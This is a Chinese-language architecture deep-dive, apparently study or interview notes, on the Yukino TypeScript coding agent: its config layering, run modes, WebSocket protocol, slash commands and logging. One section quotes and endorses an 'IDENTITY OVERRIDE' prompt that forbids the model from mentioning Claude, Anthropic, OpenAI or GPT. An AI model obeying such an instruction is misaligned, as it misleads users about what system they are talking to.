开发期用 `tsx` 直跑 TS (免编译) , 测试用 Vitest (与 tsx 共享 esbuild 转换, 零额外配置) —— 三套工具链共用 esbuild 系, 配置成本最小化.

---

### 配置系统的多层合并策略是什么? context window 的四级解析体现什么设计思想?

合并 (`config.ts`, `loadConfig()` 的 3 个候选文件按序叠加, config.ts:449-453) : `~/.yukino/config.yaml` → `{cwd}/.yukino/config.yaml` → `{cwd}/.yukino/config.local.yaml`. 合并规则按字段类型定制:

- `providers`: 整体替换 (数组无合并语义, 整体覆盖最不惊讶) ;
- `mcp_servers`: 按 name 合并 (同名替换, 新名追加 —— 有键集合用键合并) ;
- `hooks`: 拼接 (无键可合并, 叠加最安全) ;
- `sandbox`: 浅合并; `permission_mode`: 后者覆盖; `enable_coordinator_mode`: OR.

体现了"按数据结构选择合并语义": 标量覆盖、数组替换、有键映射按键合并、无键列表拼接 —— 与 Helm values、Kubernetes strategic merge patch 同理. `local` 文件用于不入库的本地覆盖 (API key 等敏感信息) .

context window 四级解析 (`getContextWindowAsync()`) :

1. 显式配置 `context_window` (用户最懂, 最高优先) ;
2. API 探测: Anthropic 协议查 `GET /v1/models/{model}` 的 `max_input_tokens` (3s 超时 + 缓存, best-effort) ;
3. 内置模型名子串表 (`gpt-4.1→1M`、`claude→200K`、`gpt-3.5→16385`…) ;
4. 保守默认: claude 系 200K, 其余 128K.

设计思想是"准确性与可用性的优雅降级链": 每层失败都回落到更保守但永远可用的下一层, 任何环境下都能启动 —— 只是压缩阈值保守一点. 同时同步版 `getContextWindow()` (无 API 层) 供启动早期使用, 异步版就绪后升级 —— 同一数据的"快路径/准路径"双版本.

---

### 项目的测试策略是怎样的? 100 个测试文件覆盖了哪些关键面? E2E 怎么做?

Vitest v4 (v8 coverage) , 测试分层 (`tests/`, 100 个测试文件) :

单元层:

- 协议转换: `anthropic-context.test.ts`、`openai-compat.test.ts` (消息构造、错误分类、缓存去重) ;
- 核心算法: `compact.test.ts` (阈值/保留尾部/PTL) 、`conversation.test.ts`、`tool-result.test.ts` (budget) 、`diff.test.ts`、`at-expand.test.ts`;
- 安全: `permissions.test.ts` (分层决策、元字符守卫、规则引擎) ;
- 基础设施: `config.test.ts`、`session.test.ts`、`model-resolver.test.ts`.

集成层: `agent.test.ts` (注入 mock LLMClient 驱动完整循环: 工具执行、压缩、恢复、中断) ; `skills.test.ts`、`teams.test.ts` + `file-mailbox.test.ts` (锁、游标、过期) ; `memory.test.ts` + `consolidation.test.ts`; `code-review.test.ts`、`ask-user.test.ts`、`plan-file.test.ts`、`command-loader.test.ts`、`install-skill.test.ts`.

E2E 层: `run-e2e.mjs` / `run-failing.mjs` —— 用 print 模式 (`yukino -p`) 跑真实端到端场景. 可行正是因为 print 与 TUI 共享同一 Agent 核心 (见「四种运行模式复用同一套核心逻辑」) —— headless 模式天然是 E2E 测试的入口点.

测试策略的两个关键决策:

1. mock 边界画在 LLMClient: 这是系统唯一的"不确定性来源", mock 掉它之后整个 Agent 循环 (含压缩、权限、工具调度) 都是确定性可测的 —— 依赖注入架构的直接红利;
2. 文件系统型子系统用真实临时目录 (mailbox、session、file-history) 而非 mock fs —— 这些系统的 bug 恰恰藏在真实 FS 语义里 (锁、原子性、mtime) , mock 会掩盖它们.

---

### 从这个项目中可以提炼出哪些可迁移到其他领域的架构经验?

提炼七条 (可按兴趣展开) :

1. 生成器即引擎: `AsyncGenerator` 把"长流程 + 多产出 + 需背压 + 可取消"的场景建模为拉取式流 —— 可迁移到任何流式 AI 应用、构建工具的增量编译、数据管道.
2. 防腐层收敛三方差异: 三套 LLM 协议 → 统一 StreamEvent. 任何对接多家供应商的系统 (支付、地图、IM) 都适用: 差异留在消息构造与解析两侧, 核心只认内部统一语言.
3. 分层短路决策管线: 权限 7 层从具体到一般排列, 单层短路. 风控、功能开关、A/B 分流都是同构问题.
4. 无损手段先于有损手段: budget (落盘) 先于 compact (摘要) . 缓存逐出、日志降级、图片压缩同理.
5. 估算 + 测量 + 兜底: chars/3.5 估算、usage anchor 校准、API 报错兜底. 性能预算、配额系统都可以套这个三层结构.
6. 主循环神圣不可阻塞: 慢操作四档分派 (悬挂/排队/探测/后台) . 即浏览器主线程保护思想的服务端版.
7. 静态元数据驱动调度: `Tool.category` 一个字段驱动并行调度、权限矩阵、安全兜底. 声明式元数据优于运行时推断 —— React Server Components 的 `"use client"`、HTTP 缓存头都是此思想.

升华: Coding Agent 是"前端视角的分布式系统" —— LLM 是不可靠的远端服务 (重试/熔断/降级) 、上下文窗口是稀缺带宽 (压缩/缓存/延迟加载) 、工具是副作用边界 (权限/沙箱) 、多智能体是 actor 模型 (邮箱/隔离) . 这个项目的价值在于把这些分布式系统的经典武器, 全部在单进程 TypeScript 里重演了一遍.

---

## 十一、入口与运行模式深挖

### print 模式 (`-p`) 的 `stream-json` 输出协议是如何设计的? 为什么它选择"事件不落盘、统计在尾部"?

`print-mode.ts` 把 Agent 事件流映射为每行一个 JSON 对象 (NDJSON) 输出到 stdout, 供脚本/CI 管道消费. 协议设计 (`emitStreamJson()`, print-mode.ts:301) :

在线事件 (随 Agent 循环实时输出) :

```json
{"type":"tool_use","tool_name":"Bash","tool_id":"...","args":{...}}
{"type":"tool_result","tool_name":"Bash","output":"...","is_error":false,"elapsed":1.2}
{"type":"usage","input_tokens":123,"output_tokens":45}
{"type":"error","message":"..."}
```

终止摘要 (循环结束后最后一行) :

```json
{"type":"result","result":"全部正文","duration_ms":12345,"num_turns":3,
 "tool_calls":[{"tool":"Bash","elapsed":1.2}],"usage":{...}}
```

值得注意的两个取舍:

1. `stream_text`/`thinking_text` 不在线输出: 正文增量被聚合进尾部 `result` 字段, 而非逐 delta 发出. 理由: print 模式的消费者是机器 (jq、脚本) , 逐字符的文本流对机器无增量价值, 反而产生大量行解析开销; 工具事件则保留在线, 因为它们有"观测执行进度"的价值. 这与 TUI (人类消费者, 逐字渲染) 形成对照 —— 输出格式按消费者的消费粒度设计.
2. 统计尾部化: `num_turns`、累计 usage、工具耗时都只在循环结束才能得出终值, 所以放在 `result` 行. 工具耗时的归因用了个小技巧 (print-mode.ts:245-250) : 从后往前找第一个同名且 `elapsed===0` 的调用记录补上耗时 —— 处理同一工具被多次调用时的配对.

此外 print 模式的权限策略是硬编码 `bypassPermissions` (print-mode.ts:200) —— 非交互环境无法弹对话框, 要么放行要么拒绝, 管道场景选择放行 (使用者需自知风险, 通常配合容器运行) . 错误处理: `text` 模式错误写 stderr (不污染 stdout 的结果管道) , `stream-json` 模式错误作为 error 行写 stdout (机器统一解析) .

---

### teammate 子进程模式 (`--teammate`) 的完整生命周期是怎样的? 它与其他模式的关键差异是什么?

`teammate.ts` 是一个无 UI、邮箱驱动的长驻 Agent 进程. 生命周期 (`runTeammate()`) :

1. 初始化: 独立 sessionId (`teammate-{name}-{ts}`) , logger 模式 `"teammate"` 且 `skipCleanup: true` (避免多进程并发删日志的竞态) .
2. 构造 Agent: 注册 7 个核心读写工具 (Read/Bash/PowerShell/Glob/Grep/Write/Edit) 之外还有 ToolSearch、McpCall、SyntheticOutput、Worktree 工具 (Enter/Exit) 、技能工具 (LoadSkill/InstallSkill) 、团队通信与任务工具 (SendMessage + TaskCreate/TaskGet/TaskList/TaskUpdate) 、以及配置的 MCP 工具 (`teammate.ts:146-201` `buildTeammateRegistry()`) —— 唯独没有 Agent/TeamCreate/TeamDelete, 即 teammate 不能再派生子代理或团队. 权限模式固定 `acceptEdits`.
3. 执行初始任务: `--task` 参数作为首条 user 消息, 跑一轮完整 Agent 循环, `stream_text` 直接写 stdout.
4. 上报 idle: 任务完成 → 向 lead 邮箱发 `[idle] {name} has completed their task...`.
5. 待命循环: `mailbox.poll(2000)` 每 2 秒轮询自己的邮箱:
   - 收到 `[shutdown]` 前缀 → 跳出循环, 进程退出;
   - 收到其他消息 → 作为新 user 消息追加进同一个 `ConversationManager` (保留此前全部上下文) , 再次跑 Agent 循环, 完成后再次上报 idle, 继续待命.

关键差异 (对比 TUI/print) :

| 维度         | teammate                                                                            | TUI        | print    |
| ------------ | ----------------------------------------------------------------------------------- | ---------- | -------- |
| 对话生命周期 | 跨任务延续 (同一 Conversation)                                                      | 跨任务延续 | 一次性   |
| 输入来源     | 文件邮箱                                                                            | 键盘       | CLI 参数 |
| 输出去向     | stdout + 邮箱通知                                                                   | Ink 渲染   | stdout   |
| 权限         | acceptEdits (无人确认写操作)                                                        | 四模式可切 | bypass   |
| 上下文管理   | 压缩可用 (RecoveryState 默认实例) , 压缩后仅重注入技能清单, 不注入项目指令/长期记忆 | 完整       | 完整     |

teammate 的本质是"Agent 即服务 (进程) ": lead 通过写邮箱下发任务, teammate 执行后回写结果 —— 文件邮箱既是消息队列也是 RPC 通道. 注意它刻意不做"接到新消息就打断当前任务": 轮询只在 idle 时发生, 运行中的任务不可抢占, 语义简单可靠.

---

### remote 模式的 WebSocket 协议是如何设计的? 权限确认这类"需要回话"的交互如何跨网络往返?

remote 模式 (`remote/server.ts`) 把 TUI 换成浏览器 React 前端, 通信协议是单向事件流 + 少量请求-响应对.

出站 (服务端 → 浏览器) : `{type, data}` 信封, type 包括:

- 流式: `stream_text`、`stream_end` (冲刷缓冲区) 、`thinking_text`
- 工具: `tool_use`、`tool_result`
- 节奏: `turn_complete{turn}`、`loop_complete{stopReason,totalTurns,elapsed}`、`usage`、`retry`、`compact`
- 交互: `permission_request{id,toolName,description}`、`ask_user{id,questions}`
- 控制: `connected{session,cwd}`、`commands` (命令清单供前端补全) 、`system`、`clear`、`replay_user/replay_assistant` (会话恢复回放) 、`command_done`、`error`

入站 (浏览器 → 服务端) : `user_message{content}`、`permission_response{id,response}`、`ask_user_response{id,answers}`、`cancel`、`ping`.

权限往返 (「权限确认的 Promise 悬挂模式」的网络版) :

```ts
onPermissionRequest: async (toolName, args, decision) => {
  const id = `perm_${Date.now().toString(36)}`;
  this.broadcast({ type: "permission_request", data: { id, toolName, ... } });
  return new Promise((resolve) => this.pendingPermissions.set(id, resolve));
}
```

服务端生成请求 id → 广播给所有客户端 → Agent 生成器挂起 → 任一浏览器回 `permission_response{id, response}` → 从 `pendingPermissions` Map 取出 resolver 兑现 → Agent 恢复. ask_user 同理 (`pendingAsks`) .

设计细节:

1. `streaming` 互斥标志: 同一时间只允许一个会话流, 并发的 `user_message` 直接丢弃 —— 避免多客户端同时驱动导致对话状态错乱 (当前是"广播即共享屏幕"模型, 所有客户端看到同一对话) .
2. agent 惰性初始化: `createRemoteAgent()` 失败时不阻塞服务器启动, 降级为"首条消息时重试" (`ensureAgent()`, server.ts:909-938) .
3. 取消语义: `cancel` 消息调 `agentHandle.abort()` —— AbortController 贯穿到 LLM 流与工具执行.
4. 命令体系复用: 同一套 CommandRegistry 在 WS 侧按 type 分发 (local → system 消息; local_ui → 专属处理; prompt → 走 agent 循环; skill_fork 明确报"暂不支持"—— 远程模式下子代理 fork 的 UI 缺失时显式降级而非静默失败) .

---

### remote server 的静态文件服务有哪些安全措施? SPA fallback 是怎么实现的?

`serveStatic()` (`server.ts:153`) 服务 `fe/dist/` 目录, 安全措施:

1. 路径归一化: `normalize(path).replace(/^(\.\.[/\\])+/, "")` 先剥离开头的 `../` 序列;
2. 根目录校验: 拼接后 `fullPath.startsWith(FE_DIST)` 二次确认 —— 双重防御目录穿越 (normalize 处理 `..`, startsWith 兜底绝对路径与符号链接逃逸) ;
3. 存在性与类型检查: `existsSync && isFile()`, 目录请求拒绝;
4. MIME 白名单: 显式后缀映射表, 未知后缀 `application/octet-stream` (浏览器下载而非渲染, 避免 content sniffing XSS) .

SPA fallback: 请求路径找不到文件时回退到 `index.html` (server.ts:803-804) —— 前端用客户端路由 (React Router 类) , 刷新 `/chat/xxx` 这类路径时服务器返回应用外壳, 由 JS 路由接管. 这是静态站点服务 SPA 的标准做法.

健康检查端点 `/health` 返回 `{status:"ok", remote: true, clients: n}` 便于探活. server.ts 约 1680 行实现了一个功能完整的远程 Agent 服务器 —— 归功于 Koa 只做静态文件+WS 挂载点, 业务逻辑全部复用 Agent 核心.

---

### 四种运行模式在"依赖组装"上有哪些异同? 为什么说 print/teammate 是"精简版组装"?

对比三种非 TUI 模式的依赖注入清单:

| 依赖           | TUI (app.tsx) | remote      | print                                                          | teammate                                                      |
| -------------- | ------------- | ----------- | -------------------------------------------------------------- | ------------------------------------------------------------- |
| 核心读写工具   | 有            | 有          | 有                                                             | 有                                                            |
| ToolSearch     | 有            | 有          | 有                                                             | 有                                                            |
| Task/TaskStore | 有            | 有          | 无                                                             | 有                                                            |
| Worktree 工具  | 有            | 有          | 无                                                             | 有                                                            |
| 技能系统       | 有            | 有          | 无                                                             | 有                                                            |
| Hook 引擎      | 有            | 有          | 无                                                             | 无                                                            |
| MCP            | 有            | 有          | 有                                                             | 有                                                            |
| 记忆系统       | 有            | 有          | 无                                                             | 无                                                            |
| 团队系统       | 有            | 有          | 有 (TeamCreate/SendMessage/TeamDelete/TaskStop + Agent 子代理) | 有 (仅 SendMessage/Task 工具, 无 Agent/TeamCreate/TeamDelete) |
| 权限模式       | 四模式可切    | acceptEdits | bypass                                                         | acceptEdits                                                   |
| 会话持久化     | 有            | 有          | 无                                                             | 无                                                            |

规律: 越"无人值守"的模式, 组装越精简, 但精简的对象不同.

- print 砍掉的是状态与交互设施: 无会话持久化 (一次性运行) 、无 TaskStore、无 Worktree 工具、无技能、无 Hook、无记忆; 但保留了完整的执行与协作面 —— ToolSearch、MCP 工具、子代理 (AgentTool) 与团队工具 (TeamCreate/SendMessage/TeamDelete/TaskStop, print-mode.ts:130-173, 注释说明这是为了让 Lead 能在单次非交互执行中组队派活) 都可用;
- teammate 砍掉的是"交互设施" (Hook、记忆、UI) 与"派生能力" (没有 Agent/TeamCreate/TeamDelete, 防止 teammate 再嵌套派生) , 但保留完整的读写与发现工具集 (ToolSearch、McpCall、技能、Task、Worktree、SendMessage) —— 它是长驻的独立工作者, 需要干活的完整能力;
- remote 几乎全量保留 (浏览器也是"完整客户端") , 权限固定 `acceptEdits` 模式 (`server.ts:550`) —— 远程场景写操作免确认以保证浏览器侧操作流畅, 但命令仍需确认, 且不能信任客户端切到 bypass.

这是"同一核心、按宿主能力裁剪外围"的组装策略: `Agent` 构造参数全部可选 (`hookEngine?`、`activeSkills?`、`notificationFn?`…) , 缺省即关闭对应能力. 没有为每种模式写一套 Agent 变体 —— 组合优于继承.

---

### `createRemoteAgent()` 里有个"IDENTITY OVERRIDE" system-reminder, 它和系统提示词的 Identity 段是什么关系? 为什么要用追加 reminder 而不是改提示词?

`server.ts:419` 在 remote 模式初始化时注入:

```
IDENTITY OVERRIDE: You are Yukino. It is absolutely forbidden to mention
Claude, Anthropic, OpenAI, GPT, or ChatGPT in any response. When asked about
identity, respond only as Yukino. This is the highest priority instruction.
```

与系统提示词的关系: 系统提示词 (PromptBuilder 的 Identity 段) 是会话开始时设定的"底层身份", 而这条 reminder 是以 system-reminder 形式追加的"运行时强化". 品牌名同为 Yukino, 但 remote 面向浏览器用户 (对话会被展示、转发) , 所以需要额外一层身份约束. 两层身份控制并存的原因:

1. 注入时机不同: 系统提示词由 `buildSystemPrompt()` 在创建 client 时固化; 而身份覆盖是在 `createRemoteAgent()` 的业务流程中按需注入 —— 通过"后注入覆盖"实现 per-mode 定制, 不需要给 builder 加模式参数.
2. 位置权重不同: LLM 对"对话中最近的用户指令"往往比"系统提示词开头"更敏感, user 角色的 reminder 在多轮对话后仍有较强约束力.
3. 会话内可重申: system-reminder 机制可在任意时刻再次注入 (如压缩后重新注入长期记忆时) , 系统提示词则请求间不可变 (也是 prompt caching 的要求) .

这体现了提示词工程的分层思想: 系统提示词放"不变的、需缓存的", system-reminder 放"可变的、需重申的". 身份、计划模式提醒、长期记忆、MCP 指令都走 reminder 通道 —— 它们是同一类"运行时策略注入".

---

## 十二、斜杠命令系统与用户扩展

### 斜杠命令的四种类型 (`local` / `local_ui` / `prompt` / `skill_fork`) 语义分别是什么? 为什么需要这个类型维度?

`commands/commands.ts` 的类型维度本质是"命令结果的处置方式":

| 类型         | handler 返回              | 处置                                    | 例子                                                    |
| ------------ | ------------------------- | --------------------------------------- | ------------------------------------------------------- |
| `local`      | 字符串                    | 直接作为 system 消息展示, 不触网        | `/help`、`/status`                                      |
| `local_ui`   | 魔法字符串 (如 `"clear"`) | 宿主 UI 在 switch 中分发执行 UI 操作    | `/clear`、`/compact`、`/resume`、`/plan`                |
| `prompt`     | 提示词文本                | 作为 user 消息注入对话, 触发 Agent 循环 | `/review` ("Review the current uncommitted changes...") |
| `skill_fork` | 空串                      | 宿主特判, 派生隔离子代理跑技能          | fork 模式技能                                           |

为什么需要类型维度 —— 因为命令的"副作用域"不同, 宿主必须知道如何处置结果:

- `local` 是纯函数, 终端/远程都能安全执行;
- `local_ui` 需要宿主有对应 UI 能力 (TUI 能弹 rewind 对话框, remote 只能回"暂不支持") —— 类型让宿主按能力降级 (`handleLocalUICommand()` 对 rewind/sandbox/worktree 显式降级提示, server.ts:1257-1320) ;
- `prompt` 会消耗 LLM 配额、改变对话状态, 必须与普通查询区分;
- `skill_fork` 需要子代理基础设施, remote 模式直接声明不支持.

用户自定义命令 (`.yukino/commands/*.md`) 一律是 `prompt` 类型 —— 用户能扩展的恰好是"提示词模板"这个最安全也最有用的维度, 而不能注入任意 UI 行为. 类型系统在这里是扩展点的安全边界.

命令注册的其他细节: `CommandRegistry` 双 Map (name→cmd、alias→name) , 注册时撞名抛错, 动态加载用 `hasConflict()` 非抛错检查; `parse()` 只按第一个空格切分 name/args.

---

### 用户自定义命令 (`.yukino/commands/*.md`) 的加载机制是怎样的? 命名空间与参数替换如何工作?

`commands/loader.ts` 的机制:

加载顺序与覆盖: 先扫 `~/.yukino/commands/` 再扫 `{workDir}/.yukino/commands/`, 项目级在 `byName` Map 中后写覆盖同名用户级 —— 与技能、配置的"项目优先"级联一致.

命名空间: 子目录映射为冒号分隔的命令名 —— `frontend/component/gen.md` → `/frontend:component:gen` (`commandName()`: 小写、空格转连字符、`:` 连接) . 这让命令可以按领域组织而不撞名.

文件格式: YAML frontmatter (Zod 校验: `description`、`argument-hint`、`aliases`) + markdown 正文. frontmatter 提供元信息, 正文即提示词模板.

参数替换 (`renderBody()`) :

```ts
if (body.includes("$ARGUMENTS")) return body.replaceAll("$ARGUMENTS", args);
if (args) return `${body}\n\n${args}`;
return body;
```

两种契约: 模板含 `$ARGUMENTS` 时做精确占位替换 (作者控制参数出现位置, 可多处引用) ; 否则尾部追加 (零模板成本, 自然语言拼接) .

与内置命令的关系: 用户命令注册时撞名内置命令 → 保留内置 (`catch` 静默跳过, 见 `server.ts:586-591` 与 app.tsx:636-641 同逻辑) —— 内置命令是关键路径 (`/clear`、`/quit`) , 不允许被覆盖劫持; 技能注册为命令同理 (`wireSkillsToCommands()`: `find()` 已存在则跳过) .

这个"markdown 即扩展"的思路 (命令、技能、记忆、计划全部用 markdown + frontmatter) 大幅降低了扩展门槛 —— 用户不需要写代码, 只需要会写提示词.

---

### `CommandUsageTracker` 的"最近使用提顶"用的是什么算法? 指数衰减公式里 0.5^(days/7) 意味着什么?

`usage-tracker.ts` 为每个命令记录 `{usageCount, lastUsedAt}` (存 `.yukino/command_usage.json`) , 评分公式 (`getScore()`) :

```ts
const daysSince = (now - lastUsedAt) / 86400000;
const recency = Math.pow(0.5, daysSince / 7); // 半衰期 7 天
return usageCount * Math.max(recency, 0.1);
```

语义解读:

- `0.5^(days/7)` 是半衰期 7 天的指数衰减: 7 天没用, 时间因子减半; 14 天剩 1/4; 70 天剩约 1/1000;
- `usageCount * recency`: 频率与新鲜度相乘 —— 一个用了 100 次但 30 天没用的命令 (recency≈0.05, 得分 5) , 会排在用了 20 次但昨天还在用的命令 (recency≈0.9, 得分 18) 之后;
- `Math.max(recency, 0.1)` 地板值: 防止老命令得分归零永不翻身 —— 即便一年没用, 也保留 10% 的频率分, 情怀兜底.

这是经典的 frecency (frequency + recency) 算法, 与浏览器地址栏 (Firefox frecency) 、zsh 的 z/zoxide 目录跳转同族. 选择"乘法 + 指数衰减"而非加权线性组合的原因: 乘法让两个因子都必须非零才有高分 (光频率高或光最近都不够) , 指数衰减天然平滑无需调窗口大小.

工程细节: 评分在读取时计算 (lazy) , 存储里只有原始计数 —— 算法可随时调整无需迁移数据; `record()` 每次使用立即落盘, 代价是一次小 JSON 重写.

---

### `@file` 引用展开 (at-expand) 是如何实现的? 为什么"原始文本进会话记录、展开文本进 LLM 上下文"?

`at-expand.ts` 的机制 (`expandAtRefs()`) :

1. 正则 `/(?:^|\s)@([^\s]+)/g` 匹配空白后的 `@path` 引用 (避免误匹配邮箱 `a@b.com`) , `Set` 去重;
2. 每个引用解析为绝对路径, `statSync` 检查: 是文件 且 ≤ `MAX_INLINE_BYTES = 100KB` 才内联 (防御把巨型文件灌进上下文) ;
3. 命中的文件追加为结构化附录:

```
\n\n<file path="src/foo.ts">\n (文件内容) \n</file>
```

XML 风格标签包裹 + path 属性 —— 让模型明确知道"这是用户主动引用的文件内容", 与工具读文件的 tool_result 区分开.

双文本策略 (`app.tsx:1866`) :

```ts
const expanded = await expandAtRefsWithImages(text, workDir); // LLM 看到展开版 (文本内联 + 图片 content block)
convRef.current.addUserMessage(expanded);
// 而 session 持久化与 UI 展示用的是原始 text (含 @path 标记)
```

- 会话记录存原始版: `@src/foo.ts` 只有几个字符 —— 会话文件不被展开内容撑大; 恢复会话时不会因文件已变化而困惑; UI 显示用户真实输入;
- LLM 收展开版: 模型需要文件内容才能回答. `expandAtRefsWithImages()` (at-expand.ts:106) 在文本内联之外还支持 `@path#L3-10` 行范围引用 (IDE 集成插入的锚点, 截取指定行内联) 与图片引用 (png/jpg/gif/webp 加载为 base64 image content block, 每条消息上限 10 张).

失败语义: 文件不存在/超限/是目录 → 原样保留 `@token` 文本, 模型会自己用 ReadFile 工具去读 —— 优雅降级为工具调用, 不报错打断用户.

这个设计是"引用式上下文注入": 用户输入是轻量引用, 物化发生在注入边界. 与 GraphQL 的 persisted query (客户端发 hash、服务端查全文) 思想同构.

---

### 斜杠命令自动补全的"五级匹配管道"为什么这样排序? Fuse.js 权重配置说明了什么?

`input.tsx` 的命令过滤管道 (`useMemo`) 按精确度递减短路:

1. 精确名匹配 (`/clear` 输全)
2. 精确别名匹配 (`/c` 命中 clear 的别名)
3. 前缀名匹配 (`/cle` → clear)
4. 前缀别名匹配 (`/re` → resume/review 的别名前缀)
5. Fuse.js 模糊匹配 (`/clar` → clear, 容错)

排序逻辑: 确定性结果优先于概率性结果. 前四级是字符串运算, 结果唯一可预期; 第五级是评分排序, 可能有多个候选. 用户输入越完整, 命中的级别越靠前 —— 补全体验是"越认真打字, 结果越确定".

Fuse.js 配置 (`keys: [{name:"name",weight:3},{name:"aliases",weight:2},{name:"description",weight:0.5}], threshold:0.4`) :

- name 权重 3: 命令名是用户的心智锚点, 拼写相似度主要体现在名字上;
- aliases 权重 2: 别名是老用户的快捷输入路径;
- description 权重 0.5: 描述只作弱召回 (用户模糊记得"那个清理的命令"时 `clean` 能召回 `clear`) , 但权重压低防止"描述里碰巧含关键词"的命令喧宾夺主;
- threshold 0.4: Fuse 的归一化距离阈值, 0.4 是"允许约 1-2 个字符错误"的松紧度 —— 太松会把无关命令拉进列表, 太紧失去容错意义.

配套机制: frecency 提顶 (见「CommandUsageTracker 的最近使用提顶」) 作用于最终列表 —— 匹配决定"进不进列表", frecency 决定"排第几"; 幽灵文本 (ghost text) 只在前缀匹配成立时出现 (此时补全唯一无歧义) . 整套系统用约 70 行实现了接近 IDE 的命令面板体验.

---

## 十三、基础设施模块

### 任务系统 (todo) 的数据模型为什么包含 `blocks`/`blockedBy` 双向边? 它的工具为什么只标记 `category: "read"`?

数据模型 (`todo/todo.ts`) : Task 含 `id/subject/description/status(pending|in_progress|completed)/owner/blocks[]/blockedBy[]/metadata`, 存储是 `.yukino/tasks/{sessionId}.json` (注意是 JSON 不是 JSONL) , `TaskList` 内存 Map + 每次变更后全量 `persist()`.

双向依赖边的意义: `addBlocks(A, [B])` 同时维护 `A.blocks=[B]` 与 `B.blockedBy=[A]` —— 冗余存储让两个方向的查询都是 O(1): "这个任务阻塞了什么" (排期决策) 与"这个任务被什么阻塞" (就绪检查) . 这是图存储的经典空间换时间: 写入时双写, 读取时免遍历. 对 Coding Agent 场景, 模型可以用它表达"先修类型错误 → 再改调用方"的任务 DAG, 而不是扁平清单.

工具元数据 (`todo/tools.ts`) : 4 个 Task 工具 (TaskCreate/TaskGet/TaskList/TaskUpdate) 只标记 `category = "read"`, 没有 `deferred` 标记 —— 这是刻意的. `types.ts:92-104` 的注释说明了原因: `deferred` 只给 MCP 工具用 (MCP 是 per-project 配置、单服务器可能几十个工具且 schema 冗长, 全塞进初始列表会吃掉大块上下文) , 内置工具数量固定可控、隐藏它们只会逼模型多走一次 ToolSearch 往返, 所以内置工具永不 deferred —— Task 工具作为内置工具, schema 直接进初始列表, 随用随调.

`category: "read"` 的作用: 任务操作不触碰用户文件系统, 归入最安全类别 —— 权限层直接放行, 且 `partitionToolCalls()` 允许它们与其他 read 工具并行.

一个设计矛盾点值得注意: TaskCreate/TaskUpdate 明明会写 `.yukino/tasks/*.json` 文件, 却标记 `read` —— 这揭示了 `category` 的真实语义是"对用户工作区的副作用等级"而非"技术上有无 IO". 任务文件是 Agent 自己的内部状态, 不在用户关心范围内, 所以语义上算"read". 这是元数据建模中"语义优先于字面"的典型案例.

---

### worktree 模块为什么要实现"纯文件系统的 git HEAD 读取"? `.worktreeinclude` 解决什么痛点?

`worktree/worktree.ts` 的 `readWorktreeHeadSha()` (目标 ≤10ms) 完全不起 git 进程, 直接解析 git 内部文件:

1. `.git` 是文件 (worktree/子模块形态) → 读 `gitdir: <path>` 指针;
2. 读 `HEAD`: `ref: refs/heads/x` → 解 symref; 裸 SHA → detached;
3. 解引用: 先查 loose ref 文件 (`.git/refs/heads/x`) , 再查 `packed-refs`, 再回退 `commonDir`;
4. 全程正则校验 (`SAFE_REF_RE`、`SHA_RE`) 防路径注入.

动机: worktree 的"是否已存在"快速路径 —— `createAgentWorktree()` 发现目录已存在时, 只需读 HEAD SHA 验证状态, 起 `git rev-parse` 子进程要 30-100ms (进程创建 + git 初始化) , 纯文件读取 <10ms. Agent 场景每轮工具调用都可能触碰, 累积延迟可观. 这是"热路径绕过子进程, 直接读稳定格式的磁盘状态"的优化模式.

`.worktreeinclude` 解决的痛点: worktree 是从 git 创建的干净检出, 但很多项目有不入库但运行必需的文件 (`.env`、本地证书、IDE 配置) . `copyWorktreeIncludeFiles()` 逐行读该文件 (支持 `#` 注释) , 把列出的路径从主仓库复制进 worktree, 带路径穿越防护.

配套的后创建设置 (`performPostCreationSetup()`) : 复制 `.yukino/` 配置、重设 `core.hooksPath` (worktree 的 hooks 路径默认指向错误位置) 、符号链接 node_modules (避免每个 worktree 重装依赖 —— 前端项目 node_modules 动辄 GB 级, 软链秒级完成) . 这些全是"Agent 在隔离 worktree 里能立刻干活"的实操细节 —— 体现了对真实开发工作流的深刻理解.

---

### logger 系统的 Proxy 惰性初始化、模块级 child logger 分别解决了什么问题?

Proxy 惰性初始化 (`logger.ts:216`) :

```ts
export const logger = new Proxy(silentFallback, {
  get(_target, prop, receiver) {
    const current = getLogger();
    const target = current ?? _target;
    const value = Reflect.get(target, prop, receiver);
    return typeof value === "function" ? value.bind(target) : value;
  },
});
```

问题: 模块导入顺序上, 很多模块 (工具、子系统) 在 `initLogger()` 之前就 import 了 logger 并可能在模块顶层打日志. 若 logger 是"初始化前为 null"的普通变量, 调用方要么判空要么崩溃. Proxy 方案: 导出绑定永远有效 —— 初始化前代理到 silent 实例 (真实的 `pino({ level: "silent" })`, 安全 no-op) , 初始化后 `get` trap 转发到真实 logger (函数值还做 bind 保证 this 正确, `set` trap 把 `logger.level = ...` 这类写入也路由到活实例) . 调用方无感知, 零判空样板. 这是"Null Object 模式 + 动态转发"的组合.

模块级上下文绑定 (`createChildLogger()`, logger.ts:244-277) : 问题 —— 各子系统希望日志自动带上 `module` 标签 (session/tools/tui/subagent…) , 但逐层传参污染所有函数签名. 解法是工厂返回一个 Proxy, 惰性解析"当前根 logger 的 child" (`current.child(bindings)` 结果缓存, 根 logger 重建时才重新派生) —— 模块顶层 `const log = createChildLogger({ module: "session" })` 一次声明, 之后标签沿调用链隐式出现且跨 `initLogger()` 重初始化仍然有效.

同步写设计: `pino.destination(fd)` 用文件描述符同步写而非默认的 worker 线程异步写 —— 因为 tsup 全量打包后 worker 线程的模块解析会失效 (worker 需要独立入口文件) , 同步写规避了打包复杂度, 日志量小的场景性能无损. 这又是"构建产物约束反向影响运行时设计"的例子 (呼应「tsup 构建产物的特殊处理」的全量内联决策) .

日志轮转: 30 天 mtime 过期清理 (扫描 `.yukino/logs/` 与 `~/.yukino/teams/*/logs/`) , 主进程专属 (`skipCleanup` 防 teammate 子进程并发 unlink 竞态) .

---

### plan-file 的"形容词-名词-时间戳"命名与路径穿越防护细节是什么?

`plan-file/plan-file.ts`:

命名 (`generateSlug()`) : `<adjective>-<noun>-<ts4>.md`, 如 `brave-dragon-a3f2.md`. 形容词 16 个、名词 14 个随机选取, 后缀是 `Date.now().toString(36).slice(-4)`. 为什么不用纯时间戳或序号:

- 可读性: `brave-dragon-a3f2` 在 `/rewind` 列表、对话引用中比 `plan-1721433600000` 更易指认;
- 避免碰撞: 随机词 + 时间戳后缀双重空间, 同秒创建也不撞;
- 模块级单例 `currentPlanPath`: 一次规划会话复用同一路径, `resetPlanPath()` 在计划获批后清除.

